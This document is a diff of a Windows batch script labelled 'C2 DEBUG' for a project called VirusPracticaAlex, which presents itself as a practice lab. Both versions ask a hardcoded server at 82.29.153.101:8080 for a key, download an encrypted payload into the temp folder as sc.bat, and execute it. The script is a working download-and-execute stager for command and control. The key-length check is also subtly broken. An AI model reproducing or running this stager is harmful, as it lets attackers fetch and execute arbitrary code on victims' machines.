@@ -1,119 +1,97 @@
 @echo off
 setlocal EnableDelayedExpansion
 chcp 65001 >nul 2>&1
-title C2 DEBUG - VirusPracticaAlex
+title C2 DEBUG - FIXED VERSION
 
 echo.
 echo ╔══════════════════════════════════════╗
-echo ║        🔥 C2 DEBUG MODE 🔥            ║
-echo ║     VirusPracticaAlex - Lab Ciber    ║
+echo ║     🔥 C2 DEBUG - FIXED 🔧           ║
+echo ║        VirusPracticaAlex             ║
 echo ╚══════════════════════════════════════╝
 echo.
 
 set "BASE=http://82.29.153.101:8080"
 set "FILE=%temp%\sc.bat"
 
-echo 📍 TEMP DIR: %temp%
-echo 🌐 BASE URL: %BASE%
+echo 📍 TEMP: %temp%
+echo 🌐 BASE: %BASE%
 echo.
 
-REM ===== 1. TIMESTAMP =====
-echo 🔢 [1] Generando TIMESTAMP...
-for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set "TS=%%i"
+REM ===== 1. TIMESTAMP - FIXED =====
+echo 🔢 [1] Generando TS (MÉTODO 1: PowerShell)...
+powershell -NoP -Command "Write-Output ([int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds())" > "%temp%\ts.txt"
+set /p TS=<"%temp%\ts.txt"
+del "%temp%\ts.txt"
 echo    -> TS=%TS%
-echo    -> TS_LEN=%TS:~9%
+echo    -> LEN=%TS:~9%
 echo.
 
-REM ===== 2. KEY GENERATION =====
-echo 🔑 [2] Solicitando KEY...
+REM ===== 2. KEY - FIXED =====
+echo 🔑 [2] KEY Generation...
 echo    -> URL: %BASE%/auth/key?ts=%TS%
-curl -v -s "%BASE%/auth/key?ts=%TS%" > "%temp%\debug_key.txt" 2>&1
+curl -s "%BASE%/auth/key?ts=%TS%" > "%temp%\key.txt" 2>"%temp%\curl_key_err.txt"
 
-for /f "delims=" %%i in ('type "%temp%\debug_key.txt"') do set "KEY=%%i"
+set /p KEY=<"%temp%\key.txt"
 if "!KEY!"=="" (
-    echo    ❌ [ERROR] KEY VACÍA
-    echo    📄 DEBUG KEY: type "%temp%\debug_key.txt"
+    echo    ❌ KEY VACÍA
+    echo    📄 KEY FILE: %temp%\key.txt
+    echo    📄 CURL ERR: %temp%\curl_key_err.txt
     pause
     exit /b 1
 )
 
-echo    -> KEY=!KEY!
-echo    -> KEY_LEN=!KEY:~43!
-echo    -> KEY_CHARS=0123456789ABCDEF...[!KEY:~43,1!]
-
-if "!KEY_LEN!" NEQ "44" (
-    echo    ❌ [ERROR] KEY inválida (!KEY_LEN! != 44)
+echo    -> KEY=!KEY:~0,44!
+echo    -> LEN=!KEY:~43!
+if "!KEY:~43!" NEQ "44" (
+    echo    ❌ LEN inválida
     pause
     exit /b 1
 )
 echo    ✅ KEY OK ✓
 echo.
 
-REM ===== 3. PAYLOAD DOWNLOAD =====
-echo 📥 [3] Descargando PAYLOAD...
-echo    -> HEADER: X-Decrypt-Key: !KEY!
-echo    -> OUTPUT: !FILE!
-
-curl -v -s ^
-  -H "X-Decrypt-Key: !KEY!" ^
+REM ===== 3. PAYLOAD - FIXED =====
+echo 📥 [3] Downloading...
+echo    -> HEADER: X-Decrypt-Key: !KEY:~0,44!
+curl -s ^
+  -H "X-Decrypt-Key: !KEY:~0,44!" ^
   "%BASE%/payload/encrypted" ^
   -o "!FILE!" ^
-  --max-time 15 ^
-  > "%temp%\debug_curl.txt" 2>&1
+  --max-time 10 ^
+  > "%temp%\curl_payload.txt" 2>&1
 
-REM Verificar CURL exit code
 if errorlevel 1 (
-    echo    ❌ [ERROR] CURL falló (errorlevel=%errorlevel%)
-    echo    📄 DEBUG CURL: type "%temp%\debug_curl.txt"
+    echo    ❌ CURL ERROR
+    type "%temp%\curl_payload.txt"
     pause
     exit /b 1
 )
 
-REM Verificar archivo creado
 if not exist "!FILE!" (
-    echo    ❌ [ERROR] Archivo NO creado: !FILE!
+    echo    ❌ FILE NO CREATED
     dir "%temp%\sc*"
     pause
     exit /b 1
 )
 
-REM Verificar tamaño
 for %%F in ("!FILE!") do set "SIZE=%%~zF"
-echo    -> FILE: !FILE!
-echo    -> SIZE: %SIZE% bytes
-echo    -> EXISTS: ✓
-
-if %SIZE% LSS 10 (
-    echo    ❌ [ERROR] Payload vacío (%SIZE% bytes)
-    echo    📄 CONTENIDO:
-    type "!FILE!"
-    pause
-    exit /b 1
-)
-echo    ✅ PAYLOAD OK ✓
+echo    -> SIZE: %SIZE% bytes ✓
 echo.
 
-REM ===== 4. PAYLOAD PREVIEW =====
-echo 👁️ [4] PREVIEW PAYLOAD (primeras 500 chars):
-echo    ╔══════════════════════════════════════╗
-type "!FILE!" | more /e +1 /n 20
-echo    ╚══════════════════════════════════════╝
+REM ===== 4. PREVIEW =====
+echo 👁️ [4] PAYLOAD PREVIEW:
+echo    ╔═══════
+type "!FILE!" | more /e +1 /n 15
+echo    ═══════╝
 echo.
 
-REM ===== 5. EJECUTAR =====
-echo ⚡ [5] EJECUTANDO PAYLOAD...
-echo    Presiona cualquier tecla para CONTINUAR o Ctrl+C para cancelar...
+REM ===== 5. EXECUTE =====
+echo ⚡ [5] EXECUTING...
+echo    [ENTER] = Run  |  [Ctrl+C] = Abort
 pause >nul
 
-echo    -> Llamando: call "!FILE!"
+echo    -> call "!FILE!"
 call "!FILE!"
 
-REM ===== 6. POST-EJECUCION =====
-echo.
-echo ✅ [FIN] C2 completado exitosamente
-echo 📂 Archivos debug:
-echo    - %temp%\debug_key.txt
-echo    - %temp%\debug_curl.txt  
-echo    - !FILE!
-echo.
+echo ✅ [DONE]
 pause
